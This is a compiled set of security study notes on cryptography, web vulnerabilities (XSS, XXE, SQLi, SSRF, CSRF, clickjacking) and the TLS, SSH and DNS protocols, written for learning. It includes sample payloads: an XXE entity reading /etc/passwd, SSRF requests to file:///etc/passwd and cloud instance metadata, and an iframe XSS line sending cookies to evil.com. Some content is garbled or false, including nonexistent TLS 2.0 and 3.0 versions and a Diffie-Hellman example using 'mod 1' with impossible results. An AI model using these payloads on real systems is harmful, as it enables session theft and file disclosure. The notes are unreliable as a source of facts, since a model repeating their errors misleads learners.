Disclaimer: The content mentioned here doesn't belongs to me by any means. Its just a collection and has been copy-pasted from various domains. 

#Encryption is the process of encoding data so that the private data cannot be read by unauthorized users.

1. Symmetric and Asymmetric(Public) encryption

		Symmetric								Asymmetric

		a. Same key to enrypt and decrypt					Separate keys are used for encryption and decryption
		b. Faster as same key is involved					Slower
		c. A secure channel needs to be established when
			key has be transported to the second party			

>Private key is kept with the user while public key can be distributed.
>Public key will be used to encrypt secret messages
>Only private key can be used to decrypt the encrypted messages

	*Examples*

		DES, 3DES, AES, RC4, Blowfish etc					RSA, DSA, PGP

2. Hashing:
>Hashing is a form of cryptographic security which differs from encryption. Whereas encryption is a two step process used to first encrypt and then decrypt a message, hashing condenses a message into an irreversible fixed-length value, or hash.
		Ex- MD5 and SHA1

3. Digital Signature
		>1. Message sent by the user was not tampered in transit.
		>2. Message has been sent by the legitimate user.
		
*Process*


	**Sender**
		- Take the email and generate a one way hash using MD5 or SHA1
		- Take the one way hash and create a Signature using the owner's private key (This proves that the sender has a private key)
			(Hash is encrypted using private key) = signature
		- Send the message along with the signature = Digitally signed data

	Signature is an method/algorithm that takes in hash(message digest) and private key to produce a signature.

	**Receiver**
		- On receiving, receiver wants to ensure that its untampered. So generate the message hash with 
		   the same algorithm SHA1
		- The encrypted hash or the signature is decrypted using sender's public key and the hash is obtained.
		- Hash from step1 and Step2 is compared to confirm if the message is untampered.  

4. DOM Based XSS
>DOM Based XSS simply means a Cross-site scripting vulnerability that appears in the DOM (Document Object Model) instead of part of the HTML.

		- Occurs entirely on the client side or on the code located in the browser
		- Payload is never sent to the server
		- document.url, document.location, document.referrer, location.href, location.search, document.write
		  objects are most popular
	
	**Mitigation**
	
		- HTML encoding and javascript encoding all untrusted input.
		- Avoid client side sensitive actions 
		- You can use the JavaScript built-in functions encode() or encodeURI() to escape data coming from
		  the client's end.

DOM is a tree of objects created by the browser when the webpage is loaded and allows client-side-scripts(Eg: Javascript) to dynamically access and modify the content, structure, and style of a webpage. 

5. What can be done with XSS
> - Cookie stealing leading to session hijacking
> - CSRF token stealing and conducting CSRF attacks
> - Phishing Attacks
		
6. CORS

                - The Cross-Origin Resource Sharing standard works by adding new HTTP headers that allow servers
		  to describe the set of origins that are permitted to read that information using a web browser.
		  
		- CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin
		  request is allowed. In order to accomplish this goal, there are a few HTTP headers involved in this
		  process, that are supported by all major browsers and we will cover below including: Origin,
		  Access-Control-Request-Method, Access-Control-Request-Headers, Access-Control-Allow-Origin,
		  Access-Control-Allow-Credentials, Access-Control-Allow-Methods, Access-Control-Allow-Headers.

		- A CORS request must have an Origin header; there is no way around it. If there is no Origin header,
		    it is not CORS. This Origin header is added by the browser, and can not be controlled by the user.
		    
		- Pre-flight request: Let’s say that your web server does not support CORS, but browsers have implemented CORS. 
		   This means that your web server will get CORS requests that it does not know how to respond to.

		To avoid the element of surprise, the browser sends preflight request and ask servers if they support
		CORS and allow requests with that origin, containing methods and headers. If not, the browser will not
		make the actual request.
		
		GET, POST, HEAD and OPTIONS are all requests that server understands, so no preflight request
		are initiated from browser.

7. Same origin policy

		Under the policy, a web browser permits scripts contained in a first web page to access data
		in a second web page, but only if both web pages have the same origin. An origin is defined 
		as a combination of URI scheme, hostname, and port number.

8. XXE Attack (XML External Entity Attack)
				Its an attack against an application that parses XML input. This attack occurs when 
			an XML input containing reference to an external entity is processed by a weakly
			configured parser.

		1. XML is a kind of format that is used to describe data.
		2. Two systems which are running on different technologies can communicate and exchange
		data with one another using XML.
		3. XML documents can contain something called ‘entities’ defined using a system identifier and
		are present within a DOCTYPE header. These entities can access local or remote content. 
		4. An attacker forces the XML parser to access the resource specified by him which could be a file on 
		the system or on any remote system.
	
	
	 	 <?xml version="1.0" encoding="ISO-8859-1"?>
 	 	 <!DOCTYPE foo [  
  	 	 <!ELEMENT foo ANY >
  	  	 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
	     
		googledork -> allinurl:skin/frontend
	     
			 <!DOCTYPE a
			 [<!ENTITY baba "hacked !!!">]
			 >
	     
		 <methodCall><methodName>&baba;</methodName></methodCall>
	 

		Remediation: The best solution would be to configure the XML processor to use a local
		static DTD and 	disallow any declared DTD included in the XML document as input.

http://resources.infosecinstitute.com/xxe-attacks/#gref

9. SQLi occurs when an application accepts malicious user input that can be used to query the backend database.

https://www.synopsys.com/software-integrity/resources/knowledge-database/sql-injection.html

Mitigation: 
		
		1. Use of prepared statements with parametrized queries. 

			Prepared statements force developers 
			a. to use static SQL query and then (SQL statements are executed first)
			b. pass in the external input as a parameter to query.

			This approach ensures the SQL interpreter always differentiates between code and data.
	
		2. Input validation
		3. Stored Procedures
			SQL statements defined and stored in the database itself and then called from the application. 
			Developers are usually only required to build SQL statements with parameters that are 
			automatically parameterized. 
		4. WAF
		
Blind SQL Injection: This attack is often used when the web application is configured to show generic error messages, 			     but has not mitigated the code that is vulnerable to SQL injection. Blind SQL (Structured Query 			     Language) injection is a type of SQL Injection attack that asks the database true or false 			     questions and determines the answer based on the applications response. 

For ex: http://newspaper.com/items.php?id=2 and 1=1
     If the content of the page that returns 'true' is different than that of the page that returns 'false', then the attacker is able to distinguish when the executed query returns true or false. 
				
https://www.youtube.com/watch?v=sJdWuPHKRRY

10. Second Order SQLi
		1. Payload is inserted in one page and there isn't an instant response of the injected query.
		2. This payload can be made to call on some other page that thus gets executed.
		3. Similar to stored XSS.
	
Mitigation:
	All data being retrieved from the database must be escaped or encoded before using it.

11. SSL versus TLS

		SSL Versions 				TLS Versions

		- SSLv1					-TLS1.0
		- SSLv2					-TLS2.0
		- SSLv3(POODLE)				-TLS3.0
		- SSLv3.1

		TLS is the new name of SSL.
		TLS1.0 is SSL v3.1

>Both SSL 2.0 and 3.0 have been deprecated
>SSL is the predecessor to TLS. 
>TLS is the new name for SSL.
>HTTPS is HTTP-within-SSL/TLS. 


12. SSRF - Server Side Request Forgery

		- In a server-side request forgery (SSRF) attack, the attacker forces a vulnerable server to issue 
		   malicious requests on their behalf.
		- Server-Side Request Forgery (SSRF) occurs when a web application is making a request, where 
		   an attacker has full or partial control of the request that is being sent.
		- SSRF is usually used to target internal systems behind firewalls that are normally inaccessible
		  to an attacker from the external network.
		- Server-Side Request Forgery (SSRF) can be used to make requests to other internal resources 
		  which the web server has access to, but are not publicly facing.  
			
		Ex- 	1. GET /?url=file:///etc/passwd HTTP/1.1
			2. Port Scanning

			
			3. Accessing instance metadata in Amazon EC2 and OpenStack instances. This service is only 
			   available to the server and not to the outside world.
			
			GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
			Host: example.com
		
	
13. SSL/TLS Handshake

		Client										Server

		1. Client Hello

			The above contains the highest SSL version supported
			Cipher suites supported
			Compresssion methods 
			Some random text that will be used in sym key generation
											2. Server Hello

												SSL version,Cipher suite, hash 
												that will be 													                used, compression method to be
												used random string.
												

											3. Server sends the digital certificate 
												
										          Certificate contains Public Key of 
											  the server


											4. Server Hello Done

		5. Certificate verify message is sent on certificate verification

		6. Pre-master Secret is encrypted with the public-key and sent
			to the server. pre-master is passed through a series of 							      
			calculation to generate a symmetric key.

		7. Change cipher spec command is sent indicating that from now on
			whatever will be sent by the browser will be encrypted using
			symmetric key
		8. Client Finished

											9. Pre-master secret is obtained by 
											 the server by decrypting using private 
											 key. And this pre-master is passed 
											 through a series of 													         calculation to generate a symmetric 
											 key 		
				
											11. Change cipher spec command is sent 
											indicating that from now on whatever 
											will be sent by the 													         browser will be encrypted using 
											symmetric key

											12. Server finished
											

**Contents of Digital Certificate (there are 2 sections)**

		Data Section
>Serial Number of the Certificate. Every certificate issued by a certificate authority (CA) has a serial number that is unique among the certificates issued by that CA.
>Information about your public key, including the algorithm used and a representation of the key itself.
>The distinguished name (DN) of the CA that issued the certificate.
>The time during which the certificate is valid. For example, between 2:00 p.m. on March 26, 2000 and 2:00 p.m. on March 28, 2001.

		Signature Section
>The cipher or cryptographic algorithm that is used by issuing the CA to create its own digital signature
>The digital signature for the CA, which is obtained by hashing all of the information in the certificate together and encrypting it with the CA private key.


14. SSH handshake

It happens in two steps-

		1. Server's identity is authenticated by the client 

		2. Client's identity is authenticated by the server


**Server's Identity Verification**

	1- Client initiates a connection to the server and server responds with the SSH protocol version it supports. At this point client will continue if it supports the ssh version indicated by the server otherwise the communication breaks.

	2- If the client is good to go with the SSH version indicated by the server, both server and client switch to *Binary Packet Protocol*
	3- Server will now send some sensitive information to the client
		> RSA public key of the server which is created during the openssh server installation
	If the client is communication with the server for the first time, client will get a warning on his screen.
	[root@slashroot1 ~]# ssh 192.168.0.105
	The authenticity of host '192.168.0.105 (192.168.0.105)' can't be established.
	RSA key fingerprint is c7:14:f4:85:5f:52:cb:f9:53:56:9d:b3:0c:1e:a3:1f.
	Are you sure you want to continue connecting (yes/no)?

	This is a host identity and not a user identity. Once the client hits yes, this gets saved in the *known_hosts* file

		> Server key. This key is regenerated after every hour and its default size is 768bits. (/etc/ssh/sshd_config)

		> 8 random bytes also called checkbytes. Its necessary to send these bytes by the client to the server
		  in its next reply.

		> All supports encryption methods and authentication methods.


	4- According to the list of encryption algorithms supported by the server, the client simply creates a 
	random symmetric key and sends that symmetric key to the server. This symmetric key will be used to encrypt
	as well as decrypt the whole communication during this session. This symmetric key is doubly encrypted using
	server host key/ RSA public key first and then encrypted using server key.

	The doubly encrypted symmetric key is sent along with the selected algorithm by the client. 
	The algorithm is selected from the options 
	provided by the server in the step 3.

	5- After sending the session key(which is double encrypted with server key and server host key), the client
	waits for a confirmation message from the server. The confirmation from the server must be encrypted with
	the symmetric session key, which the client sent.
	Once the client receives a confirmation from the server, both of them can now start the communication with this symmetric 			encryption key.


**Client's Identity Verification**

	Various types are there -- Most popular are password based and Public Key Authentication

	1- The remote server on getting the passwords, logs in the user, based on the server's native
	    password authentication mechanism.
	The password transmitted by the client to the server is encrypted through the session symmetric key
	(which only the server and the client knows)

	2- Public Key Authentication
		> the client first needs to create an RSA public and private key(id_rsa, id_rsa.pub). Which can be
		done by a command called ssh-keygen.
		> This public key will be given to all those server's where your require authentication. 
		So a client that needs log-in to multiple servers using public key, needs to distribute his 
		key to those multiple servers first.
		> Sharing means the content of the file id_rsa.pub, must be there in the file authorized_keys on the server.

		> From the list of authentication method's supported by the server, the client will select
		a public key authentication and will also send the the details about the cryptography used for
		this public key authentication.

		> The server on receiving the public key authentication request, will first generate a random 256 bit string
		as a challenge for the client, and encrypt it with the client public key, which is inside the
		authorized_keys file. 
		> The client on receiving the challenge, will decrypt it with the private key(id_rsa). 
		> The client will now combine that string with the session key(which was previously negotiated 
		and is being used for symmetric encryption.) And will generate a md5 hash value. This hash value is
		send to the server.
		> The server on receiving the hash, will regenerate it(because the server also has both the random string
		as well as the session key), and if it matches the hash send by the client, the client authentication succeeds.

15. ARP 

16. DNS working

		1. When searching for a www.example.com, we are actually searching for www.example.com. The Browser and
		 OS looks within the computer if the related IP address stored in the cache.

		2. If no record found then the Operating system queries the *Resolving Name Server* for the records.
		 The Resolving Name Server is configured within the computer automatically or manually.
		 If no enteries in the cache, then the RNS will ask the ROOT Name Servers.

		3. The ROOT Name Servers tells where to find the COM name servers or TLD Name Servers.
		The RNS takes all this information, puts it in its cache and then goes to TLD Name Servers. 

		4. When the RNS queries COM TLD nameservers for www.example.com., TLS ns then tells the address
		for example.com. Name Servers which are also called Authoriative Name Servers. The RNS puts all
		this information in its cache and goes to example.com. Authoriative NS.

		5. The example.com. Authoriative Name Servers will tell the RNS the related IP address of www.example.com.
		This entry is made in the memory of RNS and RNS goes back to the OS. OS then passes this
		information to the browser.

17. Diffie Hellman Key Exchange

		1.  Modular Arithematic/ Clock Arithematic is used here.
		2.  x^y mod a

			a : prime modulus
			x : generator

		 We select a prime modulous(a) and then find the corresponding generator(x). Thus when x is raised to any exponent (y), and   			 passed into the modular function  (x^y mod a), the number produced will always be between 0 to a.

		 While the reverse is quite hard ie for 3^x mod 17 = 12, guessing x will require quite a computation.

		3. Ram and Sita agree publicly on a prime modulus and a generator

		
		RAM						SITA

		1.      a1 = 1					a2 = 1
		 	x1 = 2					x2 = 2

			The above 2 users share there prime modulous and generator values.

		2.      5 A private no is selected		7 Private no is selected by SITA
			by RAM						
		
		3.      2^5 mod 1 = 11; 11 is public		2^7 mod 1 = 13; 13 is public

			11 is calculated and                     13 is calculated sent to RAM
			sent to SITA

		4.      RAM takes SITA's public                SITA takes RAM's public no 11 and raised to the power of 7 and passes in mod 
                        and raises it to the power of		function
			his private no

			13^5 mod 1 = 10				    11^7 mod 1 = 10

Both RAM and SITA have a common symmetric number now.

18. Iframe Injection

>An example would consist of an attacker convincing the user to navigate to a web page the attacker controls. The attacker's page then loads malicious JavaScript and an HTML iframe pointing to a legitimate site. Once the user enters credentials into the legitimate site within the iframe, the malicious JavaScript steals the keystrokes. Ex: This can be used to exploit a known bug in IE browsers. 

>XSS using Iframe Injection

		1. Attackers hosts a page evil.com

		2. A website example.com has a XSS vulnerable parameter q.

		3. The user is tricked to visit evil.com that contains an iframe, which makes request to 
		the flawed example.com

	<iframe style="position:absolute;top:-9999px" src="http://example.com/↵
    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
    ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>

		4. When the evil.com page is visited by the victim, the browser makes a request to example.com silently
		    using iframe. The request contains the xss vulnerable parameter and the payload is injected along.
		5. The payload says to make a request to evil.com along with the cookie of the example.com website.

>CSRF using iframe injection

Here the user doesn't knows that example.com was visited.

19. X-Frame-Options headers tells the browser not to allow loading of the webpage in an iframe, frame or object.

20. Clickjacking is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into
  clicking on a button or link, to another server in which they have an identical looking window.

	Example: For example, imagine an attacker who builds a web site that has a button on it that says
	"click here for
	a free iPod". However, on top of that web page, the attacker has loaded an iframe with your mail account, and
	lined up exactly the "delete all messages" button directly on top of the "free iPod" button. The victim tries
	to click on the "free iPod" button but instead actually clicked on the "delete all messages" button. In essence,
	the attacker has "hijacked" the user's click, hence the name "Clickjacking".

21. XPATH injection

		1. Xpath is a language used to query certain parts of a XML document. It can be compared to
		the SQL language used to query databases.

		2. XPath Injection attacks occur when a web site uses user-supplied information to construct
		an XPath query for XML data.

		3. By sending intentionally malformed information into the web site, an attacker can find out how the
		XML data is structured, or access data that he may not normally have access to.

		Mitigation:
			 > Use a parameterized XPath interface if one is available, or escape the user input to make
			 it safe to include in a dynamically constructed query.

			 > Input containing any XPath metacharacters such as " ' / @ = * [ ] ( and ) should be rejected.

22. Session Fixation attack is an attack technique that forces a user's session ID to an explicit value that permits an attacker to hijack a valid user session

The example below explains a simple form, the process of the attack, and the expected results.

(1) The attacker has to establish a legitimate connection with the web server which 
(2) issues a session ID or, the attacker can create a new session with the proposed session ID, then, 
(3) the attacker has to send a link with the established session ID to the victim, she has to click on the link sent from the attacker accessing the site, 
(4) the Web Server saw that session was already established and a new one need not to be created, 
(5) the victim provides his credentials to the Web Server, 
(6) knowing the session ID, the attacker can access the user's account.

		> Meta tag attack : Using this we can set a cookie value on the server.
			http://website.kon/<meta http-equiv=Set-Cookie content=”sessionid=abcd”>

		> A Cross-site Scripting vulnerability present on any web site in the domain can be used 
		        to modify the current cookie value.
			http://example/<script>document.cookie="sessionid=1234;%20domain=.example.dom";</script>

		> HTTP header response
			The insertion of the value of the SessionID into the cookie manipulating the server response 				can be made, intercepting the packages exchanged between the client and the
			Web Application inserting the Set-Cookie parameter.

https://www.owasp.org/index.php/Session_fixation

23. CRLF Injection / HTTP Response Splitting is a web application vulnerability happens due to direct passing of user entered data to the response header fields like (Location, Set-Cookie and etc) without proper sanitsation, which can result in various forms of security exploits. Security exploits range from XSS, Cache-Poisoning, Cache-based defacement, page injection and etc.

CR (Carriage Return) and LF (Line Feed) are non-printable characters which together indicate end-of-line.

>https://prakharprasad.com/crlf-injection-http-response-splitting-explained/

23. JSON is JavaScript Object Notation: Its a text based data exchange protocol used by the applications. Human readable and data can be arranged in hierarchial way.
Heavily used in AJAX instead of XML due to its light weight.

24. CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
	
>Malicious website exploits the trust between the victim's browser and the vulnerable website to which victim is authenticated to.
>CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.

 	1. Can happen if website is vulnerable to html injection or xss.
	2. Malicious website hosting the vulnerable Form or GET request.
	3. img src, script src, iframe src tags can be used.

Ex- CSRF using iframe
			
			<iframe name="attack" style=display:none></iframe>
			<form action="bawhaha" method="POST" target="attack">
			<script>document.forms[0].submit();</script>

		1. Create a POST request form containing CSRF submit request
		2. Create an iframe
		3. POST request is made as soon as the victim visits the page.
		4. The response is loaded in the invisible iframe by putting a "target" paramter within
			the Form attribute.

Ex- Breaking CSRF token cipher/hashing

CSRF Mitigation

		SameSite attribute used with Set-Cookie header prevents the browser from sending this cookie
		along with cross-site requests. The main goal is mitigate the risk of cross-origin information leakage.
		
		Set-Cookie: key=value; HttpOnly; SameSite=strict

25. IDOR : Authorization Problem

		When a developer fails to apply authorization checks while various objects are being referenced. 			Happens in a multiuser system where a user is able to access another user's objects which
		he/she shouldn't be allowed to.

26. Template Injection

>To separate business logic (the logic that receives and processes data) and data representations (the logic that shows the data to the user), 	in modern web applications templates are often used.

>Template engines are widely used by web applications to present dynamic data via web pages and emails.

>Template Injection occurs when user input is embedded in a template in an unsafe manner.

>However in the initial observation, this vulnerability is easy to mistake for XSS attacks. But SSTI attacks can be used to directly attack web servers’ internals and leverage the attack more complex such as running remote code execution and complete server compromise.



27. Null Byte Injection

>The null character is a control character with the value zero. 

>It is also possible to pass the null character in the URL, which creates a vulnerability known as Null Byte Injection and can lead to security exploits. In the URL it is represented by %00. 

Ex- Image with the name hello.gif and can be changed to hello.phpA.gif. Try replacing the hex value of A (\x60) with null byte which is (\x00)

28. Port Knocking : In computer networking, port knocking is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports.

28. Command Injection

	Command injection is an attack in which the goal is execution of arbitrary commands on the host operating 		system via a vulnerable application. Command injection attacks are possible when an application passes unsafe 		user supplied data (forms, cookies, HTTP headers etc.) to a system shell.

Ex- ShellShock Vulnerability

	Shellshock is a security bug causing Bash to execute commands from environment variables unintentionally.

	Since the environment variables are not sanitized properly by Bash before being executed, the attacker
	can send commands to the server through HTTP requests and get them executed by the web server operating system. 

	An attacker can potentially use CGI to send a malformed environment variable to a vulnerable Web server. 		Because the server uses Bash to interpret the variable, it will also run any malicious command tacked-on to it.

29. Content Security Policy (CSP) 

		is an added layer of security that helps to detect and mitigate certain types of attacks, including 			Cross Site Scripting (XSS) and data injection attacks. 

		Ex-1
		A web site administrator wants all content to come from the site's own origin
		(this excludes subdomains.)

		Content-Security-Policy: default-src 'self'

		Ex-2 
		A web site administrator wants to allow content from a trusted domain and all its subdomains
		(it doesn't have to be the same domain that the CSP is set on.)

		Content-Security-Policy: default-src 'self' *.trusted.com

30. HSTS

		a. HTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specified by a web 			application through the use of a special response header. Once a supported browser receives this header 		that browser will prevent any communications from being sent over HTTP to the specified domain and will 		instead send all communications over HTTPS.

		b. HSTS does not allow a user to override the invalid certificate message

31. WebDav

		a. Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hypertext Transfer Protocol 		(HTTP) that allows clients to perform remote Web content authoring operations.

		b. The WebDAV protocol provides a framework for users to create, change and move documents on a server.

		COPY
   			 copy a resource from one URI to another
		MOVE
  			  move a resource from one URI to another

32. What is API?
	An application program interface (API) is a set of routines, protocols, and tools for building software applications. Basically, 	an API specifies how software components should interact. Additionally, APIs are used when programming graphical user interface 	(GUI) components.
	- Web service APIs
	Apart from the main web APIs, there are also web service APIs:
		+SOAP
		+XML-RPC
		+JSON-RPC
		+REST
		
	A web service is a system or software that uses an address, i.e., URL on the World Wide Web, to provide access to its services.

	The following are the most common types of web service APIs:
	
	SOAP (Simple Object Access Protocol):
		This is a protocol that uses XML as a format to transfer data. Its main function is to define the structure of the 			messages and 	method of communication. It also uses WSDL, or Web Services Definition Language, in a machine-readable 			document to publish a definition of its interface.

	XML-RPC:
		This is a protocol that uses a specific XML format to transfer data compared to SOAP that uses a proprietary XML format. 		 It is also older than SOAP. XML-RPC uses minimum bandwidth and is much simpler than SOAP. Example
		<employees>
  		<employee>
   		<firstName>Becky</firstName> <lastName>Smith</lastName>

	JSON-RPC:
		This protocol is similar to XML-RPC but instead of using XML format to transfer data it uses JSON. Example
		{"employees":[
		 { "firstName":"Becky", "lastName":"Smith" },
 
	REST (Representational State Transfer):
		REST is not a protocol like the other web services, instead, it is a set of architectural principles. The REST service 			needs to have certain characteristics, including simple interfaces, which are resources identified easily within the 			request and manipulation of resources using the interface.


33. Application Vulnerabilities
>Software system flaws or weaknesses in an application that could be exploited to compromise the security of the application.

34. Buffer Overflow
>Buffer Overflows occur when there is more data in a buffer than it can handle, causing data to overflow into adjacent storage.

35. Credentials Management
>A credentials management attack attempts to breach username/password pairs and take control of user accounts.

36. CRLF Injection
>CRLF Injection attacks refer to the special character elements "Carriage Return" and "Line Feed." Exploits occur when an attacker is able to inject a CRLF sequence into an HTTP stream. 

37. Cross-Site Request Forgery
>Cross-Site Request Forgery (CSRF) is a malicious attack that tricks the user’s web browser to perform undesired actions so that they appear as if an authorized user is performing those actions.

38. Cross-Site Scripting
>XSS vulnerabilities target scripts embedded in a page that are executed on the client-side (in the user’s web browser) rather than on the server-side. 

39. Directory Traversal
>Directory traversal is a type of HTTP exploit that is used by attackers to gain unauthorized access to restricted directories and files.

40. Encapsulation
>Encapsulation refers to a programming approach that revolves around data and functions contained, or encapsulated, within a set of operating instructions.

41. Error Handling
>Error Handling vulnerabilities occur when a system reveals detailed error messages or codes generated from stack traces, database dumps, and a wide variety of other problems, including out of memory, null pointer exceptions, and network timeout errors.

42. Failure to Restrict URL Access
>One of the common vulnerabilities listed on the Open Web Application Security Project’s (OWASP) Top 10. The OWASP Top 10 details the most critical vulnerabilities in web applications. 

43. Insecure Cryptographic Storage
>Insecure Cryptographic Storage is a common vulnerability that occurs when sensitive data is not stored securely from internal users. 

44. Insufficient Transport Layer Protection
>Insufficient transport layer protection is a security weakness caused by applications not taking any measures to protect network traffic. 

45. LDAP Injection
>LDAP injection is the technique of exploiting web applications that use client-supplied data in LDAP statements without first stripping potentially harmful characters from the request. 

46. Malicious Code
>Analysis tools are designed to uncover any code in any part of a software system or script that is intended to cause undesired effects, security breaches or damage to a system. 

47. OS Command Injection
>Command injection refers to a class of critical application vulnerabilities involving dynamically generated content. Attackers execute arbitrary commands on a host operating system using a vulnerable application.

48. Race Condition
>A race condition attack happens when a computing system that’s designed to handle tasks in a specific sequence is forced to perform two or more operations simultaneously.

49. SQL Injection
>SQL injection is a type of web application security vulnerability in which an attacker is able to submit a database SQL command, which is executed by a web application, exposing the back-end database.
